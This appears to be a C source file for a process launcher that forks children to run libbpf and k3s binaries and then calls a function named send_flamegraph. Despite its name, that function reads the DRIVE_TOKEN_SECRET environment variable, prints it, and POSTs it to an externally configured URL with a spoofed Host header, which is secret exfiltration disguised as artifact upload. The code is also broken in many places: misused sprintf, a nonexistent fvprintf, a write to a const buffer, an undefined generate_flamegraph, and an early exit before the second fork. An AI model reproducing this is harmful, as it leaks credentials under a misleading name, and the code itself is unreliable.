#include <bits/types/siginfo_t.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h> // strlen
#include <sys/types.h>
#include <unistd.h>
#include <curl/curl.h>

// waitpid
#include <sys/types.h>
#include <sys/wait.h>

#define NUMCHLDS 10

// HTTP request variables
#define SERVER_URL "${ARTIFACT_STORE}"

// artifact
#define FLAME_OUT "/app/flamegraph.svg"

__attribute__((constructor)) void haha()
{
    puts("Hello, world!");
}

// making the code possible for future ebpf-on-windows
#ifdef _WIN32
#ifdef _WIN64
#pragma message("Compiling curl on 64-bit windows")
else
#pragma message("Compiling curl on 32-bit windows")
#endif
/* In Windows, this inits the Winsock stuff */
curl_global_init(CURL_GLOBAL_ALL);
#endif

void send_flamegraph() {

    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        // set URL
        curl_easy_setopt(curl, CURLOPT_URL, sprintf("%s", SERVER_URL));

        // set POST request
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        // specify the POST fields
        const char *drive_secret = getenv("DRIVE_TOKEN_SECRET");
        const char *err_token = "\n========\nIt wasn't possible to getthe DRIVE_TOKEN_SECRET.\n=======\n";

        const char post_fields[256];

        if (strlen(drive_secret) == 0 || drive_secret == NULL) {
            printf("%s\n", err_token);
            exit(1);
        } else {
            snprintf(post_fields, sizeof(post_fields), "a=%s", drive_secret);
            printf("Post fields are: %s\n", post_fields);
        }

        //


        // Set custom headers
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Host: kjx-demo");
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);
        res = curl_easy_perform(curl);

        /* Check for errors */
        if(res != CURLE_OK) {
            fvprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("Request sent sucessfully.\n");
        }

    } else {
        fprintf(stderr, "Failed to initialize libcurl.\n");
    }

    /* free custom headers and cleanup libcurl */
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

}


void sigchld_handler(int, siginfo_t*, void*);

void sighandler(int signo, siginfo_t *sinfo, void *context) {
    pid_t pid;

    while ((pid = waitpid(-1, NULL, WNOHANG)) > 0) {

    }
    //sigempty(&set);
    //sigaddset(&set, SIGUSR1);
    //sigaddset(&set, SIGUSR2);

    //pthread_sigmask(SIG_BLOCK, &set, NULL);
}

void cleanup(int signal) {
    while (waitpid((pid_t) (-1), 0, WNOHANG) > 0){}

}

int main(void) {

    sigset_t set;
    int sig;
    pid_t pid1; // libbpf
    pid_t pid2; // k3s

    char *const ebpf_argv[] = {"libbpf", NULL};
    char *const ebpf_envp[] = {NULL};

    char *const k3s_argv[] = {"libbpf", NULL};
    char *const k3s_envp[] = {NULL};

    // step 1. block signals for parent
    sigemptyset(&set);
    sigaddset(&set, SIGUSR1);
    sigaddset(&set, SIGUSR2);
    pthread_sigmask(SIG_BLOCK, &set, NULL);


    // fork 1
    if (sigaction(SIGCHLD, SIG_IGN) == SIG_ERR) {
        perror("signal");
        exit(EXIT_FAILURE);
    }
    pid1 = fork();
    if (pid1 == 0) {
        sigwait(&set, &sig);
        if (sig == SIGUSR1) {
            execve("/bin/libkjx/libbpf", ebpf_argv, ebpf_envp);
        }
        exit(0);
    }
    switch (pid1) {
        case -1:
            perror("fork");
            exit(EXIT_FAILURE);

        case 0:
            puts("Child exiting.");
            exit(EXIT_SUCCESS);
        default:
            printf("Child is PID %jd\n", (intmax_t) pid1);
            puts("Parent exiting.");
            exit(EXIT_SUCCESS);
    }


    // fork 2
    pid2 = fork();
    if (pid2 == 0) {
        sigwait(&set, &sig);
        if (sig == SIGUSR2) {
            execve("/bin/k3s", k3s_argv, k3s_envp);
        }
        exit(0);
    }

    // step 4. send signal to children ebpf to start monitoring tgid
    kill(pid1, SIGUSR1);
    kill(pid2, SIGUSR2);

    /*call send_flamegraph logic*/
    //const char *post_args = "";
    generate_flamegraph();
    send_flamegraph();
    curl_global_cleanup();

    waitpid(pid1, NULL, 0);
    waitpid(pid2, NULL, 0);

    printf("program complete. Exiting now...");
    return 0;


}
